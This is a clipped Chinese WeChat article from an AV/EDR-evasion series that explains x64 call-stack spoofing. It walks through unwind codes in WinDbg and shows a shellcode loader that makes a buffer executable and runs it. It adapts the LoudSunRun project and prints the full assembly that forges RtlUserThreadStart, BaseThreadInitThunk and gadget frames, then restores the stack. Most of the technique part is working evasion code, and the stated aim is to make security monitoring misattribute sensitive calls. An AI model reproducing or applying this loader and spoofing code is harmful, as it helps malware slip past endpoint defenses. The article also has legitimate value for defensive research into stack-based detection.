---
title: 【微信】【免杀】堆栈欺骗-1
source: https://mp.weixin.qq.com/s/b6oV_vWR3asE_KSAOgG_9g
source_host: mp.weixin.qq.com
clip_date: 2026-10-09T16:47:41+08:00
trace_id: 69a79296-023e-4708-b12b-c05eb423fc39
content_hash: 4a4d4d00ce9f90aa81ef1ff5c3bd4395c244653aa3871c9e1f05c120b6fcb07c
status: synced
tags:
  - 微信
  - 反调试
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 堆栈欺骗通过伪造 x64 调用栈回溯链，让 EDR 误判敏感调用来自系统模块，从而规避检测。
ai_summary_style: key-points
images_status:
  total: 9
  succeeded: 9
  failed_urls: []
notion_page_id: 3f475244-d011-81d9-bf52-e11e41d0916f
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 堆栈欺骗通过伪造 x64 调用栈回溯链，让 EDR 误判敏感调用来自系统模块，从而规避检测。
> 
> - **栈回溯机制：** x64 不再依赖 EBP 链，而由 PE 的 `.pdata` 异常目录驱动，用 `RUNTIME_FUNCTION`/`UNWIND_INFO` 中的 Unwind Codes 描述栈分配与寄存器保存。
> - **关键展开码：** `UWOP_ALLOC_SMALL` 的栈大小 = OpInfo × 8 + 8；`UWOP_PUSH_NONVOL` 计 8 字节；`UWOP_ALLOC_LARGE` 大小由后续槽位给出。
> - **手工验证：** windbg 中可用 `.fnent`、`dt _UNWIND_INFO`、`dt _UNWIND_CODE` 定位展开信息，算出返回地址偏移并用 `eq` 覆写栈内存，观察 `k` 输出变化。
> - **初级做法局限：** 仅把返回地址写 0（如 hook sleep 的 ThreadStackSpoofer）会破坏 unwind，栈帧链不完整，反显异常，并非真正欺骗。
> - **完整伪造：** 用 `RtlLookupFunctionEntry` + 递归解析 Unwind Codes 计算各帧栈大小，再经汇编 `Spoof` 伪造 `RtlUserThreadStart`、`BaseThreadInitThunk` 与 `jmp [rbx]` gadget 帧，调用后由 `fixup` 恢复栈与寄存器。

**不止Sec** *2026年10月9日 16:09*

在B站上有一个会议的中文翻译视频，讲的很细：https://www.bilibili.com/video/BV1hJnqzoEwc

正常使用 `MessageboxA` 的代码

```cpp
#include <iostream>
#include <Windows.h>
int main()
{
    MessageBox(NULL, L"Hello world", L"Message", MB_OK);
    return 0;
}
```

![image-20260929101934034](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6e89651661206e72.png)

image-20260929101934034

通过栈回溯发现 `MessageBox` 是被 `loader.exe` 的 `main` 函数加载的

## 简单shellcode加载器

再看一段简单的shellcode加载器代码

```objectivec
#include <iostream>
#include <Windows.h>
const unsigned char sc[] = "";

int main()
{
    printf("shellcode size: %d\n", sizeof(sc));
    DWORD flOldProtect;
    VirtualProtect((LPVOID)sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &flOldProtect);
    (*(void (*)()) & sc)();
    return 0;
}
```

![image-20260929102153081](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/106fb7dc96199049.png)

image-20260929102153081

这里对messagebox的调用是从loader.exe中一个没有注册过的函数 `sc` 调用的，是我我也怀疑。

## 手动模拟windbg栈回溯

关于这部分的完整、相关材料，可以阅读\[6\]

在windows 64下，与 32 位依赖 `EBP` 链不同，x64 采用纯表驱动的栈展开方式。编译器将每个非叶子函数的栈操作信息（如分配了多少栈空间、哪些非易失性寄存器被保存等）写入 PE 文件的 `.pdata` 异常目录中，具体的步骤如下(Child-SP 定位)：

1.  获取当前指令指针（RIP），定位其所属模块及函数偏移。
    
    ```
    0:000> r rip, rsp
    rip=00007ff6ccc31545 rsp=0000009ed26ff9a0
    ```
    
2.  在模块的展开信息表中查找该偏移对应的展开码（Unwind Codes），例如 `UWOP_PUSH_NONVOL` 、 `UWOP_ALLOC_SMALL` 等。
    
    ```r
    0:000> .fnent loader!main
    Debugger function entry 000001cf`c27f0230 for:
     [D:\Blog\wechat\stack_spoofer\loader\src\main.cpp @ 35] (00007ff6`ccc31500)   loader!main   |  (00007ff6`ccc315d0)   loader!__empty_global_delete
    Exact matches:
        loader!main (void)
    
    BeginAddress      = 00000000`00001500
    EndAddress        = 00000000`00001569
    UnwindInfoAddress = 00000000`0000beec
    
    Unwind info at 00007ff6`ccc3beec, 8 bytes
      version 1, flags 0, prolog 17, codes 2
      00: offs 6, unwind op 2, op info 7UWOP_ALLOC_SMALL.
      01: offs 2, unwind op 0, op info 7UWOP_PUSH_NONVOL reg: rdi.
    ```
    
    得到当前函数所在的栈回溯信息位于 `00007ff6ccc3beec`
    
    ```yaml
    0:000> dt _UNWIND_INFO 00007ff6`ccc3beec
    loader!_UNWIND_INFO
       +0x000 Version          : 0y001
       +0x000 Flags            : 0y00000 (0)
       +0x001 SizeOfProlog     : 0x17 ''
       +0x002 CountOfCodes     : 0x2 ''
       +0x003 FrameRegister    : 0y0000
       +0x003 FrameOffset      : 0y0000
       +0x004 UnwindCode       : [1] _UNWIND_CODE
    ```
    
    通过展开码查看栈帧的偏移值， `CountOfCodes = 2` 所以有两个回溯值
    
    ```yaml
    0:000> dt _UNWIND_CODE 00007ff6`ccc3beec+4
    loader!_UNWIND_CODE
       +0x000 CodeOffset       : 0x6 ''
       +0x001 UnwindOp         : 0y0010
       +0x001 OpInfo           : 0y0111
       +0x000 FrameOffset      : 0x7206
    0:000> dt _UNWIND_CODE 00007ff6`ccc3beec+4+2
    loader!_UNWIND_CODE
       +0x000 CodeOffset       : 0x2 ''
       +0x001 UnwindOp         : 0y0000
       +0x001 OpInfo           : 0y0111
       +0x000 FrameOffset      : 0x7002
    ```
    
    `UnwindOp = 2` 对应为 `UWOP_ALLOC_SMALL` 。根据\[4\]可以得到对应的内存计算公式：分配字节数 = OpInfo \* 8 + 8
    
    > 在堆栈上分配小型区域。 分配的大小是操作信息字段 \* 8 + 8，允许分配为 8 到 128 个字节。
    
    > 当一个非叶子函数（Nonleaf function）执行了诸如 `sub rsp, N` 的指令来开辟本地栈帧时，必须记录相应的展开码，以便在发生异常时，操作系统可以逆向执行这些操作以恢复调用栈（Stack Unwinding）。
    
    所以最近的一次开拓栈帧是在7*8+8 = 64 字节 = 0x40
    
    但是 `UnwindOp = 0` 是 `UWOP_PUSH_NONVOL` ，对应要 `+0x8` ，所以偏移是 `0x48`
    
3.  根据这些展开码，精确计算出当前栈帧的基址、返回地址位置以及调用者栈指针（ `Child-SP` ）。
    
    ```ruby
    0:000> r rsp
    rsp=0000009ed26ff9a0
    0:000> dqs 0000009ed26ff9a0+48 L 2
    0000009e`d26ff9e8  00007ff6`ccc31e29 loader!invoke_main+0x39 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 79]
    0000009e`d26ff9f0  0000c4d3`00000001
    0:000> k
     # Child-SP          RetAddr               Call Site
    00 0000009e`d26ff9a0 00007ff6`ccc31e29     loader!main+0x45 [D:\Blog\wechat\stack_spoofer\loader\src\main.cpp @ 39] 
    01 0000009e`d26ff9f0 00007ff6`ccc31cd2     loader!invoke_main+0x39 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 79] 
    02 0000009e`d26ffa40 00007ff6`ccc31b8e     loader!__scrt_common_main_seh+0x132 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
    03 0000009e`d26ffab0 00007ff6`ccc31ebe     loader!__scrt_common_main+0xe [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 331] 
    04 0000009e`d26ffae0 00007ff8`1d51e8d7     loader!mainCRTStartup+0xe [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_main.cpp @ 17] 
    05 0000009e`d26ffb10 00007ff8`1e54c53c     KERNEL32!BaseThreadInitThunk+0x17
    06 0000009e`d26ffb40 00000000`00000000     ntdll!RtlUserThreadStart+0x2c
    ```
    
    得到当前函数的返回地址： `00007ff6ccc31e29` ，我们修改这块内存的值，发现windbg判断的返回地址已经被我们修改了
    
    ```ruby
    0:000> eq 0000009e`d26ff9e8 0000009e`d26ff9e8
    0:000> dqs 0000009ed26ff9a0+48 L 2
    0000009e`d26ff9e8  0000009e`d26ff9e8
    0000009e`d26ff9f0  0000c4d3`00000001
    0:000> k
     # Child-SP          RetAddr               Call Site
    00 0000009e`d26ff9a0 0000009e`d26ff9e8     loader!main+0x45 [D:\Blog\wechat\stack_spoofer\loader\src\main.cpp @ 39] 
    01 0000009e`d26ff9f0 0000c4d3`00000001     0x0000009e`d26ff9e8
    02 0000009e`d26ff9f8 00007fff`6f4924f8     0x0000c4d3`00000001
    ```
    
    这里如果修改的精细一点就可以伪造出重复栈返回地址
    
    ![image-20261009111053099](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/60e875ed1fda8a0b.png)
    
    image-20261009111053099
    
    ![image-20261009111301063](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d9aa92a020e56157.png)
    
    image-20261009111301063
    
    ![image-20261009111841203](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c1bfa4dabe48ea47.png)
    
    image-20261009111841203
    
    从而显得我们的返回地址来自系统模块，这样可以迷惑EDR使其认为调用来自于系统（至少这项技术刚出现时是这样的，堆栈欺骗的初始版本是在unkown cheats上面的老哥为了欺骗游戏反作弊而产生的，原帖地址\[5\]）
    

## 初步“堆栈欺骗”

\[2\]中使用将返回地址写0来打破堆栈的追踪，他举得是一个 hook sleep 的例子

其实这个不算真正的堆栈欺骗，原作者说到

> As it's been pointed out to me, the technique here is not yet truly holding up to its name for being a stack spoofer. Since we're merely overwriting return addresses on the thread's stack, we're not spoofing the remaining areas of the stack itself. Moreover we're leaving our call stack unwindable meaking it look anomalous since the system will not be able to properly walk the entire call stack frames chain.

> 正如有人指出的那样，目前的这项技术还算不上名副其实的“栈欺骗”（stack spoofing）。由于我们仅仅覆盖了线程栈上的返回地址，并未对栈的其他区域进行伪造，因此欺骗并不完整。此外，这种做法导致调用栈无法正常回溯（unwind），从而显得异常，因为系统将无法正确遍历完整的调用栈帧链。

```cpp
void WINAPI MySleep(DWORD _dwMilliseconds)
{
    //[...]
    auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
    const auto origReturnAddress = *overwrite;
    *overwrite = 0;

    //[...]
    *overwrite = origReturnAddress;
}
```

按照同样的思路修改

```cs
void testMessageBox() {
    auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
    const auto origReturnAddress = *overwrite;
    DWORD flOldProtect;
    VirtualProtect((LPVOID)sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &flOldProtect);
    *overwrite = 0;
    (*(void (*)()) & sc)();
    *overwrite = origReturnAddress;
}

int main()
{
    printf("shellcode size: %d\n", sizeof(sc));
    testMessageBox();
    return 0;
}
```

![image-20261009112119584](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a7dca039d38fd359.png)

image-20261009112119584

这里相当于是把返回地址清空

## 尝试伪造

上一步中只是截断了堆栈的回溯，这里我们要得到一个看起来完整的栈，即从 `KERNEL32!BaseThreadInitThunk+0x17` 和 `ntdll!RtlUserThreadStart+0x2c` 出发的伪造栈帧(stack frame)

这里由于代码重复度过高，选择改造 \[7\] https://github.com/susMdT/LoudSunRun

仓库的原作者是对 `printf` 、 `gets` 的函数调用和 `pNtAllocateVirtualMemory` 的直接系统调用进行了测试，其主要测试思路就是顺着64位函数调用的传参顺序，Windows 64 位（x64）默认使用 Microsoft x64 调用约定： `rcx` ， `rdx` ， `r8` ， `r9` ，stack栈，对于伪造堆栈的话最有影响的就是多参数对栈的影响。

为了保存栈内容的相关信息，作者使用了如下结构体保存

```cpp
typedef struct
{
    PVOID       Fixup;             // 0
    PVOID       OG_retaddr;        // 8
    PVOID       rbx;               // 16
    PVOID       rdi;               // 24
    PVOID       BTIT_ss;           // 32
    PVOID       BTIT_retaddr;      // 40
    PVOID       Gadget_ss;         // 48
    PVOID       RUTS_ss;           // 56
    PVOID       RUTS_retaddr;      // 64
    PVOID       ssn;               // 72  
    PVOID       trampoline;        // 80
    PVOID       rsi;               // 88
    PVOID       r12;               // 96
    PVOID       r13;               // 104
    PVOID       r14;               // 112
    PVOID       r15;               // 120
} PRM, * PPRM;
```

想这么做的第一步肯定是获得要伪造的两个栈底在当前的值

```ini
ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("kernel32.dll"), "BaseThreadInitThunk")) + 0x14; // Would walk export table but am lazy
p.BTIT_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
p.BTIT_retaddr = ReturnAddress;

ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlUserThreadStart")) + 0x21;
p.RUTS_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
p.RUTS_retaddr = ReturnAddress;
```

其中 `FindGadget` 是寻找 `kernel.dll` 这种核心模块里面能够执行 `jmp [rbx]` 寄存器的值

```kotlin
ULONG CalculateFunctionStackSizeWrapper(PVOID ReturnAddress)
{
    //...
    // [0] Sanity check return address.
    //...
    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    //...
    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
Cleanup:
    return status;
}
```

然后关键的来了， `CalculateFunctionStackSizeWrapper` 基本模拟了我们刚才手动实现栈回溯的操作，先找到`.pdata` 段的RunTimeFunction

```kotlin
ULONG CalculateFunctionStackSizeWrapper(PVOID ReturnAddress)
{
    //...
    // [0] Sanity check return address.
    //...
    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    //...
    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
Cleanup:
    return status;
}
```

其中 `RtlLookupFunctionEntry` 作用如下

```cs
NTSYSAPI PRUNTIME_FUNCTION RtlLookupFunctionEntry(
  [in]  DWORD64               ControlPc,
  [out] PDWORD64              ImageBase,
  [out] PUNWIND_HISTORY_TABLE HistoryTable
);
```

-   `ControlPc` ：函数中指令捆绑的虚拟地址
    
-   `ImageBase` ：函数所属的模块的基址
    
-   `HistoryTable` ：模块的全局指针值
    

然后调用 `CalculateFunctionStackSize` 根据其中的 `unwindOperation` 计算栈的大小

```java
/* Credit to VulcanRaven project for the original implementation of these two*/
ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase, StackFrame stackFrame)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;

    // [0] Sanity check incoming pointer.
    // ...
    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame.totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = true;
                // Record when rbp is pushed to stack.
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            //Alloc size is op info field * 8 + 8.
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame.setsFramePointer = true;
            break;
        default:
            printf("[-] Error: Unsupported Unwind Op Code\n");
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
Cleanup:
    return status;
}
```

其中关于栈帧相关的内容有

```objectivec
typedef struct
{
    LPCWSTR dllPath;
    ULONG offset;
    ULONG totalStackSize;
    BOOL requiresLoadLibrary;
    BOOL setsFramePointer;
    PVOID returnAddress;
    BOOL pushRbp;
    ULONG countOfCodes;
    BOOL pushRbpIndex;
} StackFrame, * PStackFrame;
```

最后调用Spoof完成堆栈欺骗的操作但是Spoof是汇编写的，所以可能难读一些

1，保存返回值等等

```css
Spoof proc

    pop    rax                         ; 在rax中保存真实的返回地址
    mov    r10, rdi                    ; 保存函数参数rdi 到 r10
    mov    r11, rsi                    ; 保存函数参数rsi 到 r11

    mov    rdi, [rsp + 32]             ; 将栈上的PRM结构体保存到 rdi
    mov    rsi, [rsp + 40]             ; 将栈上的要调用的返回地址保存到 rsi

    ;这里的rdi已经是我们的结构体了，按照偏移保存寄存器的值
    mov [rdi + 24], r10                ; Storing OG rdi into param
    mov [rdi + 88], r11                ; Storing OG rsi into param
    mov [rdi + 96], r12                ; Storing OG r12 into param
    mov [rdi + 104], r13                ; Storing OG r13 into param
    mov [rdi + 112], r14                ; Storing OG r14 into param
    mov [rdi + 120], r15                ; Storing OG r15 into param

    mov r12, rax                       ; OG code used r12 for ret addr
```

2，处理按栈传参的参数，移动栈上的相关参数

```perl
; ---------------------------------------------------------------------
; Prepping to move stack args
; ---------------------------------------------------------------------

xor r11, r11            ; r11 will hold the # of args that have been "pushed"
mov r13, [rsp + 30h]     ; r13 will hold the # of args total that will be pushed

mov r14, 200h           ; r14 will hold the offset we need to push stuff
add r14, 8
add r14, [rdi + 56]     ; stack size of RUTS
add r14, [rdi + 48]     ; stack size of BTIT
add r14, [rdi + 32]     ; stack size of our gadget frame
sub r14, 20h            ; first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time

mov r10, rsp            
add r10, 30h            ; offset of stack arg added to rsp

looping:

    xor r15, r15            ; r15 will hold the offset + rsp base
    cmp r11, r13            ; comparing # of stack args added vs # of stack args we need to add
    je finish

    ; ---------------------------------------------------------------------
    ; Getting location to move the stack arg to
    ; ---------------------------------------------------------------------

    sub r14, 8          ; 1 arg means r11 is 0, r14 already 0x28 offset.
    mov r15, rsp        ; get current stack base
    sub r15, r14        ; subtract offset

    ; ---------------------------------------------------------------------
    ; Procuring the stack arg
    ; ---------------------------------------------------------------------

    add r10, 8
    push [r10]
    pop [r15]     ; move the stack arg into the right location

    ; ---------------------------------------------------------------------
    ; Increment the counter and loop back in case we need more args
    ; ---------------------------------------------------------------------
    add r11, 1
    jmp looping

finish:
```

3，伪造堆栈

1.  先开辟足够的栈空间，并截断最底层的 `RtlUserThreadStart`
    
    ```apache
    sub    rsp, 200h
    push 0
    ```
    
2.  开始伪造 `RtlUserThreadStart` 和 `BaseThreadInitThunk` 以及选用的 `jmp [rbx]`
    
    ```perl
    ; ----------------------------------------------------------------------
    ; RtlUserThreadStart + 0x14  frame
    ; ----------------------------------------------------------------------
    
    sub    rsp, [rdi + 56]
    mov    r11, [rdi + 64]
    mov    [rsp], r11
    
    ; ----------------------------------------------------------------------
    ; BaseThreadInitThunk + 0x21  frame
    ; ----------------------------------------------------------------------
    
    sub    rsp, [rdi + 32]
    mov    r11, [rdi + 40]
    mov    [rsp], r11
    
    ; ----------------------------------------------------------------------
    ; Gadget frame
    ; ----------------------------------------------------------------------
    
    sub    rsp, [rdi + 48]
    mov    r11, [rdi + 80]
    mov    [rsp], r11
    ```
    
3.  准备真实函数调用相关的参数配置
    
    ```sql
    ; ----------------------------------------------------------------------
    ; Adjusting the param struct for the fixup
    ; ----------------------------------------------------------------------
    
    mov    r11, rsi                    ; Copying function to call into r11
    
    mov    [rdi + 8], r12              ; Real return address is now moved into the "OG_retaddr" member
    mov    [rdi + 16], rbx             ; original rbx is stored into "rbx" member
    lea    rbx, [fixup]                ; Fixup address is moved into rbx
    mov    [rdi], rbx                  ; Fixup member now holds the address of Fixup
    mov    rbx, rdi                    ; Address of param struct (Fixup) is moved into rbx
    
    ; ----------------------------------------------------------------------
    ; Syscall stuff. Shouldn't affect performance even if a syscall isnt made
    ; ----------------------------------------------------------------------
    mov    r10, rcx
    mov    rax, [rdi + 72]
    
    jmp    r11
    ```
    
4.  ![image-20261009151642938](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e0dacdc87edbec37.png)
    
    image-20261009151642938
    

4，调用完成后进入收尾阶段（恢复栈帧）

```css
fixup: 
    mov     rcx, rbx
    add     rsp, 200h           ; 收回伪造的栈
    add     rsp, [rbx + 48]     ; Stack size
    add     rsp, [rbx + 32]     ; Stack size
    add     rsp, [rbx + 56]     ; Stack size
    mov     rbx, [rcx + 16]     ; Restoring OG RBX
    mov rdi, [rcx + 24]         ; ReStoring OG rdi
    mov rsi, [rcx + 88]         ; ReStoring OG rsi
    mov r12, [rcx + 96]         ; ReStoring OG r12
    mov r13, [rcx + 104]        ; ReStoring OG r13 
    mov r14, [rcx + 112]        ; ReStoring OG r14
    mov r15, [rcx + 120]        ; ReStoring OG r15 
    jmp     QWORD ptr [rcx + 8]
```

![image-20261009151934463](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7555e309c391ad82.png)

image-20261009151934463

![image-20261009154951265](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fd43a39ad1b14e2c.png)

image-20261009154951265

完整demo地址：

https://github.com/Joe1sn/LearnStackSpoofing

## 引用

\[1\] https://www.cobaltstrike.com/blog/behind-the-mask-spoofing-call-stacks-dynamically-with-timers

\[2\] https://github.com/mgeeky/ThreadStackSpoofer

\[3\] https://www.bilibili.com/video/BV1hJnqzoEwc

\[4\] https://github.com/MicrosoftDocs/cpp-docs/blob/main/docs/build/exception-handling-x64.md

\[5\] https://www.unknowncheats.me/forum/counterstrike-global-offensive/489248-correct-bypass-return-address-checks.html

\[6\] https://codemachine.com/articles/x64_deep_dive.html

\[7\] https://github.com/susMdT/LoudSunRun

免杀 · 目录
